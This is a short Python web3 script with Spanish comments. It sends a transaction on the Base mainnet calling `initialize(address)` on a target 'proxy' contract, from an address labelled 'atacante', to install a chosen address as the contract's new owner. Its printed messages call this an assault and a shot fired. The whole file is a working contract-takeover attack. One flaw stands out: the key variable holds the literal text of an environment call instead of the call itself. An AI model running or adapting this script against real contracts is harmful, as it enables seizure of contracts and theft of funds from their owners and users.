import time
from web3 import Web3

# 1. CONEXIÓN A LA RED BASE
RPC = 'https://mainnet.base.org'
w3 = Web3(Web3.HTTPProvider(RPC))

# 2. COORDENADAS TÁCTICAS
proxy = w3.to_checksum_address('0x0000000071727De22E5E9d8BAf0edAc6f37da032')
atacante = w3.to_checksum_address('0x96De980a766CCb10A19B6962587e2b61B650b372')
destino_final = w3.to_checksum_address('0xB9073c07648a414B875874d7B8599dD2fAa171E8')

# 3. LLAVE MAESTRA
KEY = 'os.getenv("PRIVATE_KEY")'

def asalto_base():
    print(f"📡 REMI: Re-intentando secuencia sobre BASE...")
    
    # Selector '0x8129fc1c' para initialize(address)
    data = "0x8129fc1c" + destino_final[2:].lower().zfill(64)
    
    try:
        nonce = w3.eth.get_transaction_count(atacante)
        gas_price = int(w3.eth.gas_price * 1.5)

        tx = {
            'from': atacante,
            'to': proxy,
            'nonce': nonce,
            'data': data,
            'gas': 120000, # Subimos un poco más por seguridad
            'gasPrice': gas_price,
            'chainId': 8453
        }

        print("⚡ Firmando transacción (Versión Corregida)...")
        signed = w3.eth.account.sign_transaction(tx, KEY)
        
        # EL CAMBIO CRÍTICO ESTÁ AQUÍ: raw_transaction en lugar de rawTransaction
        tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
        
        print(f"✅ ¡DISPARO ENVIADO! Hash: {tx_hash.hex()}")
        print(f"🎯 Verificando en Basescan el nuevo Owner: {destino_final}")
        
    except Exception as e:
        print(f"❌ FALLO TÉCNICO: {e}")

if __name__ == "__main__":
    asalto_base()
